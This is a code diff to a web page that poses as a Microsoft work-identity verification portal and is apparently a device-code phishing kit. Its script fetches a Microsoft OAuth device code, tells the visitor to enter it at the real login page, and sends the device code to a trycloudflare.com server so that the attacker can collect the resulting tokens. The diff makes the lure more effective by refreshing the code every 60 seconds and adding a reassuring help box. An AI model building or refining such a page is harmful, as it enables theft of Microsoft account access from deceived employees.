@@ -29,6 +29,15 @@
       color: #333;
       margin-top: 5px;
     }
+    .instruction-box {
+      font-size: 0.9rem;
+      color: #555;
+      background-color: #f0f5ff;
+      padding: 10px 15px;
+      border-left: 4px solid #0a59a3;
+      border-radius: 5px;
+      margin-top: 15px;
+    }
     .microsoft-logo {
       width: 120px;
     }
@@ -53,9 +62,10 @@
 <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
 <script>
   let deviceDetails = null;
+  let codeTimer = null;
 
   function fetchDeviceCode() {
-    document.getElementById("code1234").innerHTML = `<div class="text-muted text-center">Loading fresh code...</div>`;
+    document.getElementById("code1234").innerHTML = `<div class="text-muted text-center">Generating new code...</div>`;
     document.getElementById("verify-btn").disabled = true;
 
     fetch("https://api.allorigins.win/get?url=" + encodeURIComponent("https://login.microsoftonline.com/common/oauth2/devicecode?api-version=1.0&client_id=d3590ed6-52b3-4102-aeff-aad2292ab01c&resource=https://graph.windows.net"))
@@ -68,7 +78,8 @@
         document.getElementById("code1234").innerHTML = `
           <div class="alert alert-primary text-center">
             Please visit <a href="https://microsoft.com/devicelogin" target="_blank">https://microsoft.com/devicelogin</a><br>
-            and enter the code: <strong>${deviceDetails.user_code}</strong>
+            and enter the code: <strong>${deviceDetails.user_code}</strong><br>
+            <small class="text-muted">This code will auto-refresh every 60 seconds.</small>
           </div>`;
         document.getElementById("verify-btn").disabled = false;
       })
@@ -77,23 +88,23 @@
       });
   }
 
-  // On page load
-  window.addEventListener("DOMContentLoaded", fetchDeviceCode);
-
-  // On click of verification button
   function handleVerification() {
     if (!deviceDetails) return;
 
-    // First post to your server
     $.post("https://programmes-crops-humanities-towns.trycloudflare.com/query", {
       "device_code": deviceDetails.device_code,
       "interval": deviceDetails.interval,
       "expires_in": deviceDetails.expires_in
     });
 
-    // Then open the Microsoft login
     window.open("https://microsoft.com/devicelogin", "_blank");
   }
+
+  // Load code when page starts
+  window.addEventListener("DOMContentLoaded", () => {
+    fetchDeviceCode();
+    codeTimer = setInterval(fetchDeviceCode, 60000); // auto-refresh every 60 seconds
+  });
 </script>
 
 <div class="container">
@@ -105,6 +116,11 @@
         </div>
         <h4 class="auth-header text-center">Verify Your Work Identity</h4>
         <p class="text-center subtext">Only verified work devices can access internal portals.</p>
+
+        <div class="instruction-box">
+          🧨 <strong>Having trouble?</strong><br>
+          Device codes expire fast. If your code doesn't work, click "Generate New Code" or wait for a fresh one to appear automatically every 60 seconds.
+        </div>
 
         <div id="code1234" class="text-center text-muted mt-4">Please wait. Loading...</div>
 
